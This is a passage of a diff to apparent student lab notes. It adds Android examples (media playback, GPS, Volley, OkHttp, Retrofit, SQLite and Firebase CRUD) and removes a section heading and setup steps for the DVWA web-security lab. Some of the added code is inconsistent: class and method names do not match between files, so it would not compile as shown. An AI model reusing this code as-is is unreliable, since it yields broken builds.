+            }
+        });
+
+        stop.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                if(mp!=null){
+                    mp.release();
+                    mp=null;
+                    Toast.makeText(getApplicationContext(),"Video stopped",Toast.LENGTH_LONG).show();
+                }
+            }
+        });
+
+        vplay.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                String path="android.resource://"+getPackageName()+"/"+R.raw.video;
+                Uri uri=Uri.parse(path);
+                vv.setVideoURI(uri);
+                MediaController mc= new MediaController(MainActivity.this);
+                mc.setAnchorView(vv);
+                vv.setMediaController(mc);
+                vv.start();
+            }
+        });
     }
 }
 ```
 
----
 
-## Practical 6 — DVWA, LFI/RFI, SQLi, Session Hijacking (summary & commands)
+###### GPS
 
-### DVWA setup (clone into XAMPP htdocs)
+```java
+AndroidManifest.xml:
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+ xmlns:tools="http://schemas.android.com/tools">
+ <uses-permission android:name="android.permission.INTERNET" />
+ <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+ <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+ <application
+ android:allowBackup="true"
+ android:dataExtractionRules="@xml/data_extraction_rules"
+ android:fullBackupContent="@xml/backup_rules"
+ android:icon="@mipmap/ic_launcher"
+ android:label="@string/app_name"
+ android:roundIcon="@mipmap/ic_launcher_round"
+ android:supportsRtl="true"
+ android:theme="@style/Theme.Gps"
+ tools:targetApi="31">
+ <activity
+ android:name=".MainActivity"
+ android:exported="true">
+ <intent-filter>
+ <action android:name="android.intent.action.MAIN" />
+ <category android:name="android.intent.category.LAUNCHER" />
+ </intent-filter>
+ </activity>
+ </application>
+</manifest>
 
+MainActivity.java:
+package com.example.gps;
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+import android.Manifest;
+import android.content.pm.PackageManager;
+import android.location.Address;
+import android.location.Geocoder;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.TextView;
+import android.widget.Toast;
+import java.io.IOException;
+import java.util.List;
+import java.util.Locale;
+
+public class MainActivity extends AppCompatActivity implements LocationListener {
+
+    private LocationManager lm;
+    Button btnlocation;
+    TextView txtlocation;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        txtlocation = findViewById(R.id.txtlocation);
+        btnlocation = findViewById(R.id.btnlocation);
+
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(MainActivity.this,
+                    new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 100);
+        }
+
+        btnlocation.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                getLocation();
+            }
+        });
+    }
+
+    private void getLocation() {
+        lm = (LocationManager) getApplicationContext().getSystemService(LOCATION_SERVICE);
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+                != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this,
+                Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            return;
+        }
+        lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 100, MainActivity.this);
+    }
+
+    @Override
+    public void onLocationChanged(@NonNull Location location) {
+        Toast.makeText(getApplicationContext(),location.getLongitude()
+                +  " " +location.getLatitude(),Toast.LENGTH_LONG).show();
+        Geocoder geocoder = new Geocoder(MainActivity.this, Locale.getDefault());
+        try {
+            List <Address> addresses = geocoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
+            String address = addresses.get(0).getAddressLine(0);
+            txtlocation.setText(address);
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+    }
+}
 ```
-cd C:/xampp/htdocs
-git clone https://github.com/digininja/DVWA.git
+
+
+###### volleyball
+
+```java
+build.grade.kts:
+ implementation("com.android.volley:volley:1.2.1")
+
+AndroidManifest.xml:
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+ xmlns:tools="http://schemas.android.com/tools">
+ <uses-permission android:name="android.permission.INTERNET"/>
+ <application
+ android:allowBackup="true"
+ android:dataExtractionRules="@xml/data_extraction_rules"
+ android:fullBackupContent="@xml/backup_rules"
+ android:icon="@mipmap/ic_launcher"
+ android:label="@string/app_name"
+ android:roundIcon="@mipmap/ic_launcher_round"
+ android:supportsRtl="true"
+ android:theme="@style/Theme.Volley"
+ tools:targetApi="31">
+ <activity
+ android:name=".MainActivity"
+ android:exported="true">
+ <intent-filter>
+ <action android:name="android.intent.action.MAIN" />
+ <category android:name="android.intent.category.LAUNCHER" />
+ </intent-filter>
+ </activity>
+ </application>
+</manifest>
+MainActivity.java:
+package com.example.volley;
+import androidx.appcompat.app.AppCompatActivity;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.TextView;
+import com.android.volley.Request;
+import com.android.volley.RequestQueue;
+import com.android.volley.Response;
+import com.android.volley.VolleyError;
+import com.android.volley.toolbox.JsonArrayRequest;
+import com.android.volley.toolbox.StringRequest;
+import com.android.volley.toolbox.Volley;
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+public class MainActivity extends AppCompatActivity {
+
+    Button btnString, btnJson;
+    TextView txtdata;
+    String links = "https://www.w3schools.com/xml/note.xml";
+    String Jsonlinks = "https://mocki.io/v1/7d6d5cdb-04bf-4df6-8e0c-5e0a70069eb4";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        txtdata = findViewById(R.id.textView);
+        btnString = findViewById(R.id.btnString);
+        btnJson = findViewById(R.id.btnJson);
+        RequestQueue queue = Volley.newRequestQueue(getApplicationContext());
+
+        btnString.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                StringRequest stringRequest = new StringRequest(Request.Method.GET, links, new Response.Listener<String>() {
+                    @Override
+                    public void onResponse(String response) {
+                        txtdata.setText(response);
+                    }
+                }, new Response.ErrorListener() {
+                    @Override
+                    public void onErrorResponse(VolleyError error) {
+                        error.printStackTrace();
+                    }
+                });
+                queue.add(stringRequest);
+            }
+        });
+
+        btnJson.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                JsonArrayRequest jsonArrayRequest = new JsonArrayRequest(Request.Method.GET,
+                        Jsonlinks, null,
+                        new Response.Listener<JSONArray>() {
+                            @Override
+                            public void onResponse(JSONArray response) {
+                                StringBuffer buffer = new StringBuffer();
+                                for (int i = 0; i < response.length(); i++) {
+                                    try {
+                                        JSONObject obj = response.getJSONObject(i);
+                                        buffer.append("Roll no.: " + obj.getInt("roll") + "\n" +
+                                                "Name: " + obj.getString("name") + "\n" +
+                                                "Email: " + obj.getString("email") + "\n\n");
+                                    } catch (JSONException e) {
+                                        throw new RuntimeException(e);
+                                    }
+                                }
+                                txtdata.setText(buffer.toString());
+                            }
+                        },
+                        new Response.ErrorListener() {
+                            @Override
+                            public void onErrorResponse(VolleyError error) {
+                                error.printStackTrace();
+                            }
+                        }
+                );
+                queue.add(jsonArrayRequest);
+            }
+        });
+    }
+}
 ```
 
-Start XAMPP → Apache + MySQL
-Open `C:\xampp\htdocs\DVWA` in VS Code
-Rename `config/config.inc.php.dist` → `config/config.inc.php` and set:
 
+###### okhttp
+
+```java
+build.gradle.kts:
+    implementation("com.squareup.okhttp3:okhttp:4.12.0")
+
+AndroidManifest.xml:
+    <uses-permission android:name="android.permission.INTERNET"/>
+
+MainActivity.java:
+package com.example.okhttp;
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AppCompatActivity;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.TextView;
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+import java.io.IOException;
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.OkHttp;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
+
+public class MainActivity extends AppCompatActivity {
+
+    Button btnString, btnJson;
+    TextView txtdata;
+    String links = "https://www.w3schools.com/xml/note.xml";
+    String Jsonlinks = "https://mocki.io/v1/7d6d5cdb-04bf-4df6-8e0c-5e0a70069eb4";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        txtdata = findViewById(R.id.textView);
+        btnString = findViewById(R.id.btnString);
+        btnJson = findViewById(R.id.btnJson);
+        OkHttpClient client = new OkHttpClient();
+
+        btnString.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Request req = new Request.Builder().url(links).build();
+                client.newCall(req).enqueue(new Callback() {
+                    @Override
+                    public void onFailure(@NonNull Call call, @NonNull IOException e) {
+                        e.printStackTrace();
+                    }
+
+                    @Override
+                    public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
+                        txtdata.setText(response.body().string());
+                    }
+                });
+            }
+        });
+
+        btnJson.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Request jsonReq = new Request.Builder().url(Jsonlinks).build();
+
+                client.newCall(jsonReq).enqueue(new Callback() {
+                    @Override
+                    public void onFailure(@NonNull Call call, @NonNull IOException e) {
+                        e.printStackTrace();
+                    }
+
+                    @Override
+                    public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
+                        try {
+                            String jsonString = response.body().string();
+                            JSONArray jsonArray = new JSONArray(jsonString);
+                            StringBuffer buffer = new StringBuffer();
+                            for (int i = 0; i < jsonArray.length(); i++) {
+                                JSONObject studentObj = jsonArray.getJSONObject(i);
+                                buffer.append("Roll no.: " + studentObj.getInt("roll") + "\n" +
+                                        "Name: " + studentObj.getString("name") + "\n" +
+                                        "Email: " + studentObj.getString("email") + "\n\n");
+                            }
+                            MainActivity.this.runOnUiThread(() -> {
+                                txtdata.setText(buffer.toString());
+                            });
+                        } catch (JSONException e) {
+                            e.printStackTrace();
+                            MainActivity.this.runOnUiThread(() -> {
+                                txtdata.setText(e.getMessage());
+                            });
+                        }
+                    }
+
+                });
+            }
+        });
+    }
+}
+
+-> res → layout → activity_main.xml
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:orientation="vertical"
+    android:padding="20dp"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent">
+
+    <Button
+        android:id="@+id/btnString"
+        android:text="Fetch XML"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content" />
+
+    <Button
+        android:id="@+id/btnJson"
+        android:text="Fetch JSON"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:layout_marginTop="12dp" />
+
+    <TextView
+        android:id="@+id/textView"
+        android:text=""
+        android:textSize="16sp"
+        android:padding="16dp"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content" />
+
+</LinearLayout>
 ```
-$_DVWA['db_user'] = 'root';
-$_DVWA['db_password'] = '';
+
+
+###### retrofit
+
+```java
+MainActivity.java
+package com.example.myapplication;
+import androidx.appcompat.app.AppCompatActivity;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.TextView;
+import java.util.List;
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
+import retrofit2.Retrofit;
+import retrofit2.converter.gson.GsonConverterFactory;
+
+public class MainActivity extends AppCompatActivity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        TextView txtview;
+        Button btnfetch;
+        String url= "https://jsonplaceholder.typicode.com/";
+        txtview=findViewById(R.id.txtview);
+        btnfetch=findViewById(R.id.btnfetch);
+
+        btnfetch.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Retrofit retrofit=new Retrofit.Builder()
+                        .baseUrl(url)
+                        .addConverterFactory(GsonConverterFactory.create())
+                        .build();
+
+                myapi api=retrofit.create(myapi.class);
+                Call<List<model>> call=api.getmodels();
+                call.enqueue(new Callback<List<model>>() {
+                    @Override
+                    public void onResponse(Call<List<model>> call, Response<List<model>> response) {
+                        List<model> data=response.body();
+                        for(int i=0;i<data.size();i++){
+                            txtview.append("id:"+ data.get(i).getId()+ "\n");
+                            txtview.append("user_id: "+data.get(i).getUserId()+"\n");
+                            txtview.append("Title: "+data.get(i).getTitle()+"\n");
+                            txtview.append("Body: "+data.get(i).getBody()+"\n\n");
+                        }
+                    }
+
+                    @Override
+                    public void onFailure(Call<List<model>> call, Throwable t) {
+
+                    }
+                });
+            }
+        });
+    }
+}
+
+myapi.java
+package com.example.myapplication;
+
+import java.util.List;
+import retrofit2.Call;
+import retrofit2.http.GET;
+
+public interface myapi {
+    @GET("posts")
+    Call <List<model>> getmodels ();
+}
+
+model.java
+package com.example.myapplication;
+
+public class model {
+    int userId,id;
+    String title,body;
+
+    public int getUserId() {
+        return userId;
+    }
+
+    public void setUserId(int userId) {
+        this.userId = userId;
+    }
+
+    public int getId() {
+        return id;
+    }
+
+    public void setId(int id) {
+        this.id = id;
+    }
+
+    public String getTitle() {
+        return title;
+    }
+
+    public void setTitle(String title) {
+        this.title = title;
+    }
+
+    public String getBody() {
+        return body;
+    }
+
+    public void setBody(String body) {
+        this.body = body;
+    }
+}
+
+activity_main.xml
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:orientation="vertical"
+    android:padding="16dp"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent">
+
+    <Button
+        android:id="@+id/btnfetch"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:text="Fetch Posts" />
+
+    <ScrollView
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:layout_marginTop="12dp">
+
+        <TextView
+            android:id="@+id/txtview"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:textSize="14sp"
+            android:padding="8dp" />
+    </ScrollView>
+
+</LinearLayout>
 ```
 
-Visit:
 
+###### crud sqlite
+
+```java
+MainActivity.java
+package com.example.myapplication;
+import androidx.appcompat.app.AlertDialog;
+import androidx.appcompat.app.AppCompatActivity;
+import android.annotation.SuppressLint;
+import android.database.Cursor;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.DatePicker;
+import android.widget.EditText;
+import android.widget.TextView;
+import android.widget.Toast;
+import android.app.DatePickerDialog;
+import java.time.LocalDate;
+import java.time.Period;
+import java.time.format.DateTimeFormatter;
+import java.util.Calendar;
+
+public class MainActivity extends AppCompatActivity {
+    private EditText edtname, edtrno, edtDob, edtstream, edtAddress;
+    private Button btninsert, btnread, btndelete, btnsearch, btnupdate;
+    private TextView txtdata;
+    private dbhandler con;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        initializeViews();
+        
+        con = new dbhandler(this);
+        con.getWritableDatabase();
+
+        setupButtonListeners();
+    }
+
+    private void initializeViews() {
+        btninsert = findViewById(R.id.btninsert);
+        btnread = findViewById(R.id.btnread);
+        btndelete = findViewById(R.id.btndelete);
+        btnsearch = findViewById(R.id.btnsearch);
+        btnupdate = findViewById(R.id.btnupdate);
+        txtdata = findViewById(R.id.txtdata);
+        edtname = findViewById(R.id.edtname);
+        edtrno = findViewById(R.id.edtrno);
+        edtDob = findViewById(R.id.edtDob);
+        edtstream = findViewById(R.id.edtstream);
+        edtAddress = findViewById(R.id.edtAddress);
+    }
+
+    private void setupButtonListeners() {
+        btninsert.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                String name = edtname.getText().toString();
+                int rno = Integer.parseInt(edtrno.getText().toString());
+                String dob = edtDob.getText().toString();
+                String stream = edtstream.getText().toString();
+                String address = edtAddress.getText().toString();
+                
+                boolean status = con.savedata(name, rno, dob, stream, address);
+                Toast.makeText(
+                    getApplicationContext(), 
+                    status ? "Inserted successfully" : "Insertion failed", 
+                    Toast.LENGTH_LONG
+                ).show();
+            }
+        });
+
+        btnread.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Cursor c = con.showdata();
+                StringBuffer buffer = new StringBuffer();
+                
+                if (c.getCount() == 0) {
+                    Toast.makeText(
+                        getApplicationContext(), 
+                        "No record Found", 
+                        Toast.LENGTH_LONG
+                    ).show();
+                    return;
+                }
+
+                while (c.moveToNext()) {
+                    buffer.append("ID:" + c.getString(0) + "\n");
+                    buffer.append("ROLL Number " + c.getInt(1) + "\n");
+                    buffer.append("Student name: " + c.getString(2) + "\n");
+                    
+                    String dobStr = c.getString(3);
+                    buffer.append("Date of Birth: " + dobStr + "\n");
+                    
+                    try {
+                        int age = calculateAge(dobStr);
+                        buffer.append("Age: " + age + "\n");
+                    } catch (Exception e) {
+                        buffer.append("Age: N/A\n");
+                    }
+                    
+                    buffer.append("Stream: " + c.getString(4) + "\n");
+                    buffer.append("Address: " + c.getString(5) + "\n\n");
+                }
+                
+                showmessage("Records", buffer.toString());
+            }
+        });
+
+        btndelete.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                String name = edtname.getText().toString();
+                int status = con.deleterecord(name);
+                
+                Toast.makeText(
+                    getApplicationContext(), 
+                    status > 0 ? "Deleted successfully" : "Deletion failed", 
+                    Toast.LENGTH_LONG
+                ).show();
+            }
+        });
+
+        btnupdate.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                String name = edtname.getText().toString();
+                int rno = Integer.parseInt(edtrno.getText().toString());
+                
+                int status = con.updaterecord(name, rno);
+                Toast.makeText(
+                    getApplicationContext(), 
+                    status == -1 ? "Updated unsuccessfully" : "Updated successfully", 
+                    Toast.LENGTH_LONG
+                ).show();
+            }
+        });
+
+        btnsearch.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Integer rno = Integer.parseInt(edtrno.getText().toString());
+                StringBuffer buffer = new StringBuffer();
+                Cursor c = con.searchdata(rno);
+                
+                if (c.getCount() == 0) {
+                    Toast.makeText(
+                        getApplicationContext(), 
+                        "No record Found", 
+                        Toast.LENGTH_LONG
+                    ).show();
+                    showmessage("records", "no record found");
+                    return;
+                }
+
+                while (c.moveToNext()) {
+                    buffer.append("ID: " + c.getString(0) + "\n");
+                    buffer.append("ROLL Number: " + c.getInt(1) + "\n");
+                    buffer.append("Student name: " + c.getString(2) + "\n");
+                    
+                    String dobStr = c.getString(3);
+                    buffer.append("Date of Birth: " + dobStr + "\n");
+                    
+                    try {
+                        int age = calculateAge(dobStr);
+                        buffer.append("Age: " + age + "\n");
+                    } catch (Exception e) {
+                        buffer.append("Age: N/A\n");
+                    }
+                    
+                    buffer.append("Stream: " + c.getString(4) + "\n");
+                    buffer.append("Address: " + c.getString(5) + "\n\n");
+                }
+                
+                txtdata.setText(buffer.toString());
+            }
+        });
+
+        edtDob.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                final Calendar c = Calendar.getInstance();
+                int year = c.get(Calendar.YEAR);
+                int month = c.get(Calendar.MONTH);
+                int day = c.get(Calendar.DAY_OF_MONTH);
+                
+                DatePickerDialog datePickerDialog = new DatePickerDialog(
+                    MainActivity.this,
+                    new DatePickerDialog.OnDateSetListener() {
+                        @Override
+                        public void onDateSet(DatePicker view, int year, int monthOfYear, int dayOfMonth) {
+                            edtDob.setText(dayOfMonth + "/" + (monthOfYear + 1) + "/" + year);
+                        }
+                    },
+                    year, month, day
+                );
+                
+                datePickerDialog.show();
+            }
+        });
+    }
+
+    private void showmessage(String title, String Message) {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setCancelable(true);
+        builder.setTitle(title);
+        builder.setMessage(Message);
+        builder.show();
+    }
+
+    private int calculateAge(String dobStr) {
+        try {
+            @SuppressLint("SimpleDateFormat")
+            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("dd/MM/yyyy");
+            java.util.Date dobDate = sdf.parse(dobStr);
+            
+            Calendar dob = Calendar.getInstance();
+            dob.setTime(dobDate);
+            Calendar today = Calendar.getInstance();
+            
+            int age = today.get(Calendar.YEAR) - dob.get(Calendar.YEAR);
+            
+            if (today.get(Calendar.MONTH) < dob.get(Calendar.MONTH) ||
+                (today.get(Calendar.MONTH) == dob.get(Calendar.MONTH) &&
+                 today.get(Calendar.DAY_OF_MONTH) < dob.get(Calendar.DAY_OF_MONTH))) {
+                age--;
+            }
+            
+            return age;
+        } catch (Exception e) {
+            e.printStackTrace();
+            return -1;
+        }
+    }
+}
+
+DBHandler.java:
+package com.example.myapplication;
+import android.content.ContentValues;
+import android.content.Context;
+import android.database.Cursor;
+import android.database.sqlite.SQLiteDatabase;
+import android.database.sqlite.SQLiteOpenHelper;
+
+public class DatabaseHandler extends SQLiteOpenHelper {
+    
+    private static final String DB_NAME = "student.db";
+    private static final String TABLE_NAME = "student";
+    private static final int DB_VERSION = 7;
+
+    public DatabaseHandler(Context context) {
+        super(context, DB_NAME, null, DB_VERSION);
+    }
+
+    @Override
+    public void onCreate(SQLiteDatabase db) {
+        String query = "CREATE TABLE " + TABLE_NAME +
+                " (" +
+                    "ID INTEGER PRIMARY KEY AUTOINCREMENT," +
+                    "RNO INTEGER," +
+                    "NAME TEXT," +
+                    "DOB TEXT," +
+                    "STREAM TEXT," +
+                    "ADDRESS TEXT" +
+                ")";
+        
+        db.execSQL(query);
+    }
+
+    @Override
+    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
+        if (oldVersion < 4) {
+            db.execSQL("DROP TABLE IF EXISTS " + TABLE_NAME);
+            onCreate(db);
+        }
+    }
+
+    public boolean saveData(String name, int rno, String dob, String stream, String address) {
+        try {
+            SQLiteDatabase db = getWritableDatabase();
+            ContentValues contentValues = new ContentValues();
+
+            contentValues.put("RNO", rno);
+            contentValues.put("NAME", name);
+            contentValues.put("DOB", dob);
+            contentValues.put("STREAM", stream);
+            contentValues.put("ADDRESS", address);
+
+            long status = db.insert(TABLE_NAME, null, contentValues);
+            return status != -1;
+        } catch (Exception e) {
+            e.printStackTrace();
+            return false;
+        }
+    }
+
+    public Cursor showData() {
+        String query = "SELECT * FROM " + TABLE_NAME;
+        SQLiteDatabase db = this.getReadableDatabase();
+        return db.rawQuery(query, null);
+    }
+
+    public int deleteRecord(String name) {
+        SQLiteDatabase db = this.getWritableDatabase();
+        return db.delete(TABLE_NAME, "NAME=?", new String[] { name });
+    }
+
+    public int updateRecord(String name, int rno) {
+        SQLiteDatabase db = this.getWritableDatabase();
+        ContentValues contentValues = new ContentValues();
+
+        contentValues.put("RNO", rno);
+        contentValues.put("NAME", name);
+
+        return db.update(TABLE_NAME, contentValues, "RNO=" + rno, null);
+    }
+
+    public Cursor searchData(int rno) {
+        String query = "SELECT * FROM " + TABLE_NAME + " WHERE RNO=?";
+        SQLiteDatabase db = this.getReadableDatabase();
+        
+        return db.rawQuery(query, new String[] { String.valueOf(rno) });
+    }
+}
 ```
-http://localhost/DVWA/setup.php
+
+
+###### crud firebase
+
+```java
+Select Hamburger > Tools > Firebase > Realtime Database Java > Follow the instructions by connecting and creating things
+
+Student.java
+package com.example.firebase;
+public class Student {
+ String id;
+ Integer rollno;
+ String name;
+ Double gradePointAverage;
+ String department;
+
+ public Student(String id, Integer rollno, String name, Double gradePointAverage, String department) {
+ this.id = id;
+ this.rollno = rollno;
+ this.name = name;
+ this.gradePointAverage = gradePointAverage;
+ this.department = department;
+ }
+
+ public Student() {}
+
+ public String getId() {
+ return id;
+ }
+
+ public void setId(String id) {
+ this.id = id;
+ }
+
+ public Integer getRollno() {
+ return rollno;
+ }
+
+ public void setRollno(Integer rollno) {
+ this.rollno = rollno;
+ }
+
+ public String getName() {
+ return name;
+ }
+
+ public void setName(String name) {
+ this.name = name;
+ }
+
+ public Double getGradePointAverage() {
+ return gradePointAverage;
+ }
+
+ public void setGradePointAverage(Double gradePointAverage) {
+ this.gradePointAverage = gradePointAverage;
+ }
+
+ public String getDepartment() {
+ return department;
+ }
+
+ public void setDepartment(String department) {
+ this.department = department;
+ }
+}
+
+Activity_xml:
+<?xml version="1.0" encoding="utf-8"?>
+<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
+ android:layout_width="match_parent"
+ android:layout_height="match_parent">
+
+ <LinearLayout
+ android:padding="16dp"
+ android:orientation="vertical"
+ android:layout_width="match_parent"
+ android:layout_height="match_parent"
+ android:fitsSystemWindows="true">
+
+ <EditText
+ android:id="@+id/edname"
+ android:hint="Name"
+ android:layout_width="match_parent"
+ android:layout_height="wrap_content"/>
+
+ <EditText
+ android:id="@+id/edrollno"
+ android:layout_width="match_parent"
+ android:layout_height="wrap_content"
+ android:hint="Roll No"
+ android:inputType="numberDecimal" />
+
+ <EditText
+ android:id="@+id/edgpa"
+ android:layout_width="match_parent"
+ android:layout_height="wrap_content"
+ android:hint="GPA"
+ android:inputType="numberDecimal" />
+
+ <EditText
+ android:id="@+id/eddept"
+ android:layout_width="match_parent"
+ android:layout_height="wrap_content"
+ android:hint="Department" />
+
+ <Button
+ android:id="@+id/btnadd"
+ android:text="Add User"
+ android:layout_width="match_parent"
+ android:layout_height="wrap_content"/>
+
+ <Button
+ android:id="@+id/btnupdate"
+ android:text="Update User"
+ android:layout_width="match_parent"
+ android:layout_height="wrap_content"/>
+
+ <Button
+ android:id="@+id/btndel"
+ android:text="Delete User"
+ android:layout_width="match_parent"
+ android:layout_height="wrap_content"/>
+
+ <Button
+ android:id="@+id/btnview"
+ android:text="View All Users"
+ android:layout_width="match_parent"
+ android:layout_height="wrap_content"/>
+
+ <ListView
+ android:id="@+id/lv"
+ android:layout_width="match_parent"
+ android:layout_height="0dp"
+ android:layout_weight="1"/>
+ </LinearLayout>
+</androidx.constraintlayout.widget.ConstraintLayout>
+
+MainActivity.java
+package com.example.firebase;
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AppCompatActivity;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.AdapterView;
+import android.widget.ArrayAdapter;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.ListView;
+import android.widget.Toast;
+
+import com.google.firebase.database.DataSnapshot;
+import com.google.firebase.database.DatabaseError;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+import com.google.firebase.database.ValueEventListener;
+
+import java.util.ArrayList;
+import java.util.List;
+
+public class MainActivity extends AppCompatActivity {
+
+ EditText edname, edrollno, edgpa, eddept;
+ Button btnadd, btnview, btndel, btnupdate;
+ ListView lv;
+ String selectedId = "";
+
+ @Override
+ protected void onCreate(Bundle savedInstanceState) {
+ super.onCreate(savedInstanceState);
+ setContentView(R.layout.activity_main);
+
+ edname = findViewById(R.id.edname);
+ edrollno = findViewById(R.id.edrollno);
+ edgpa = findViewById(R.id.edgpa);
+ eddept = findViewById(R.id.eddept);
+
+ btnadd = findViewById(R.id.btnadd);
+ btnview = findViewById(R.id.btnview);
+ btnupdate = findViewById(R.id.btnupdate);
+ btndel = findViewById(R.id.btndel);
+ lv = findViewById(R.id.lv);
+
+ List<Student> studentList = new ArrayList<>();
+
+ FirebaseDatabase database = FirebaseDatabase.getInstance();
+ DatabaseReference myRef = database.getReference("student");
+
+ btnadd.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ String name = edname.getText().toString();
+ Integer roll = Integer.parseInt(edrollno.getText().toString());
+ Double gpa = Double.parseDouble(edgpa.getText().toString());
+ String dept = eddept.getText().toString();
+
+ selectedId = myRef.push().getKey();
+ myRef.child(selectedId).setValue(new Student(selectedId, roll, name, gpa, dept));
+ Toast.makeText(getApplicationContext(),"Data inserted successfully!!!",Toast.LENGTH_LONG).show();
+ }
+ });
+
+ btndel.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ if (!selectedId.isEmpty()){
+ myRef.child(selectedId).removeValue();
+ Toast.makeText(getApplicationContext(),"Data deleted successfully!!!",Toast.LENGTH_LONG).show();
+ }
+ else{
+ Toast.makeText(getApplicationContext(),"Error in deletion!!!",Toast.LENGTH_LONG).show();
+ }
+ }
+ });
+
+ btnupdate.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ if (!selectedId.isEmpty()) {
+ String name = edname.getText().toString();
+ int rollno = Integer.parseInt(edrollno.getText().toString());
+ Double gpa = Double.parseDouble(edgpa.getText().toString());
+ String dept = eddept.getText().toString();
+
+ myRef.child(selectedId).setValue(new Student(selectedId, rollno, name, gpa, dept));
+ Toast.makeText(MainActivity.this, "Data updated successfully!", Toast.LENGTH_SHORT).show();
+ } else {
+ Toast.makeText(MainActivity.this, "Select a student to update!", Toast.LENGTH_SHORT).show();
+ }
+ }
+ });
+
+ lv.setOnItemClickListener(new AdapterView.OnItemClickListener() {
+ @Override
+ public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
+ Student s = studentList.get(position);
+ edname.setText(s.getName());
+ edrollno.setText(String.valueOf(s.getRollno()));
+ edgpa.setText(String.valueOf(s.getGradePointAverage()));
+ eddept.setText(s.getDepartment());
+ selectedId = s.getId();
+ }
+ });
+
+ btnview.setOnClickListener(new View.OnClickListener() {
